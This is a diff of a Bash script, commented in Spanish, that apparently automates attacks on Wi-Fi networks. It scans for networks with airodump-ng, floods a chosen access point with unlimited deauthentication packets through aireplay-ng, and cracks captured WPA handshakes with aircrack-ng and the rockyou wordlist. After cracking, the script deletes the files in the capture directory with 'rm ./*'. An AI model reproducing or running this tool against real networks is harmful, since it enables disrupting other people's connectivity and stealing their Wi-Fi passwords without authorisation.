@@ -27,7 +27,7 @@ intro(){
 SELECTED_INTERFACE=""
 MON_INTERFACE=""
 
-DIRECTORTY=`pwd`
+MAIN_DIRECTORTY=`pwd`
 
 select_interface(){    
     clear
@@ -109,8 +109,6 @@ open_terminal() {
 
     # Esperar que la terminal se inicie
     sleep 1
-
-    # Obtener ID del proceso del terminal
 
 
     # Obtener ID de la ventana asociada al proceso
@@ -198,24 +196,24 @@ select_wireless(){
         return 1    
     fi
         
-    TIMEOUT_SCAN="25"
+    TIMEOUT_SCAN=10
     # Si estamos en un entorno gráfico
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
         #Verifica si se puede leer la resolución
         if get_screen_resolution ; then
             #Abre una terminal en una determinada posición 
             open_terminal "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg'" "$UP_LEFT"
+            #Dejamos que se ejecute en segundo plano el escaneo antes de mirar la informacion
+            sleep $TIMEOUT_SCAN
         else
             # Si no tenemos resulción ejecutaremos una terminal sin determinar la posición ni tamaño.
             x-terminal-emulator -e "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg"
         fi 
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
-        timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg
+        timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg # VERIFICAR PORQUE AHORA NO HACE OUTPUT
     fi
     
-    #Dejamos que se ejecute en segundo plano el escaneo antes de mirar la informacion
-    sleep $TIMEOUT_SCAN
     
     if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
         echo "File csv with network not found"
@@ -273,7 +271,7 @@ select_wireless(){
         echo "$BSSID_VAR $ESSID_VAR"
 
     else
-        echo "invalid ID ."
+        echo "Invalid ID ."
     fi
 
     rm $FILE
@@ -317,6 +315,33 @@ Deauther(){
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
         nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
+    fi
+
+}
+
+Craking_handshake(){
+
+    cd data_collected/network_dump
+
+    FILE="wificapture-01.cap"
+
+    if [[ -z $FILE ]];then
+        echo "ERROR file not found"
+        return 1
+    fi
+        
+    WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+    #OUTPUT=`aircrack-ng $FILE -w $WORDLIST`
+
+    if aircrack-ng $FILE -w $WORDLIST ;then
+        echo "FOUND KEYS"
+        rm ./*
+        return 0
+    else 
+        echo "NO FOUND"
+        rm ./*
+        return 1
     fi
 
 }
@@ -378,28 +403,8 @@ Bruteforce(){
 
     sleep $TIMEOUT_USR
 
-    cd data_collected/network_dump
-
-    FILE="wificapture-01.cap"
-
-    if [[ -z $FILE ]];then
-        echo "ERROR file not found"
-        return 1
-    fi
+    #Craking_handshake
     
-    WORDLIST="/usr/share/wordlists/rockyou.txt"
-
-    #OUTPUT=`aircrack-ng $FILE -w $WORDLIST`
-
-    if aircrack-ng $FILE -w $WORDLIST ;then
-        echo "FOUND KEYS"
-        rm ./*
-        exit 0
-    else 
-        echo "NO FOUND"
-        rm ./*
-        exit 1
-    fi
 }
 
 menu(){
@@ -512,10 +517,6 @@ menu(){
     done
 
 }
-
-
-
-
 
 USERID=`id -u`
 
